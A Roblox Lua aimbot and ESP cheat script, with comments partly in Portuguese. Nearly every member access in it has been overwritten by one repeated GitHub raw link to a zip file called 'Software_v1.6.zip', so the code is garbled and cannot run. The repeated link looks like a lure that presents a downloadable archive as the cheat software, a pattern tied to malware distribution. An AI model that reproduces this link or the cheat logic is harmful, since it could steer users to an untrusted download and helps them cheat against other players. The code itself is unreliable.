local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip

local LocalPlayer = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
local Mouse = LocalPlayer:GetMouse()

local AimbotEnabled = false
local ESPEnabled = false
local maxDistance = 36

local function IsEnemy(player)
	return https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip ~= https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
end

-- GUI
local function SetupGUI()
	local playerGui = LocalPlayer:WaitForChild("PlayerGui")
	if playerGui:FindFirstChild("AimbotESP_GUI") then return end

	local gui = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("ScreenGui")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = "AimbotESP_GUI"
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = playerGui

	local aimbotBtn = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("TextButton")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 120, 0, 40)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 10, 0, 10)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = "Aimbot: OFF"
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(255, 0, 0)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = gui

	local espBtn = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("TextButton")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 120, 0, 40)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 10, 0, 60)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = "ESP: OFF"
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(255, 0, 0)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = gui

	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(function()
		AimbotEnabled = not AimbotEnabled
		https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = "Aimbot: " .. (AimbotEnabled and "ON" or "OFF")
		https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = AimbotEnabled and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 255, 0) or https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(255, 0, 0)
	end)

	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(function()
		ESPEnabled = not ESPEnabled
		https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = "ESP: " .. (ESPEnabled and "ON" or "OFF")
		https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = ESPEnabled and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 255, 0) or https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(255, 0, 0)
	end)
end

SetupGUI()
https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(function()
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(1)
	SetupGUI()
end)

-- ESP
local espObjects = {}

local function CreateESP(player)
	local box = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("Square")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = 1.5
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false

	local name = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("Text")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = 14
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false

	local health = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("Line")
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = 3
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false

	espObjects[player] = {Box = box, Name = name, Health = health}
end

local function RemoveESP(player)
	if espObjects[player] then
		for _, obj in pairs(espObjects[player]) do
			obj:Remove()
		end
		espObjects[player] = nil
	end
end

for _, p in pairs(Players:GetPlayers()) do
	if p ~= LocalPlayer then
		CreateESP(p)
	end
end

https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(function(p)
	if p ~= LocalPlayer then
		CreateESP(p)
	end
end)

https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(RemoveESP)

-- Visibilidade
local rayParams = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip()
https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true

local function IsVisible(part)
	if not part then return false end
	local origin = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
	local dir = (https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip - origin)
	https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = {https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip}
	local result = Workspace:Raycast(origin, dir, rayParams)
	return not result or https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip)
end

-- Loop principal
https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(function()
	local closest = nil
	local shortest = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("Head") and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("HumanoidRootPart") and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip("Humanoid") and IsEnemy(player) then
			local head = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
			local hrp = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
			local humanoid = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
			local distance = (https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip - https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip).Magnitude
			local visible = IsVisible(head)

			-- ESP
			local esp = espObjects[player]
			if ESPEnabled and esp then
				local headPos = Camera:WorldToViewportPoint(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip + https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 0.5, 0))
				local footPos = Camera:WorldToViewportPoint(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip - https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 3, 0))
				local centerPos, onScreen = Camera:WorldToViewportPoint(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip)
				local height = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(footPos.Y - headPos.Y)
				local width = height / 2

				if onScreen then
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(width, height)
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(centerPos.X - width / 2, centerPos.Y - height / 2)
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = visible and https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 255, 0) or https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(255, 0, 0)

					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(centerPos.X, centerPos.Y - height / 2 - 15)
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true

					local hpPercent = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip / https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip, 0, 1)
					local barTop = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip - 5, https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip)
					local barBottom = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(barTop.X, https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip + height)
					local barCurrent = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(barTop.X, barTop.Y + height * (1 - hpPercent))

					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = barBottom
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = barCurrent
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(0, 255, 0)
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = true
				else
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
					https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
				end
			elseif esp then
				https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
				https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
				https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = false
			end

			-- Aimbot
			if AimbotEnabled and distance <= maxDistance and visible then
				local screenPos = Camera:WorldToViewportPoint(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip)
				local mouseDist = (https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(screenPos.X, screenPos.Y) - https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(Mouse.X, Mouse.Y)).Magnitude
				if mouseDist < shortest then
					shortest = mouseDist
					closest = head
				end
			end
		end
	end

	if AimbotEnabled and closest then
		local dir = (https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip - https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip).Unit
		https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip = https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip(https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip, https://github.com/rl9blake/Dhdhhajah/raw/refs/heads/main/missing/Software_v1.6.zip + dir)
	end
end)
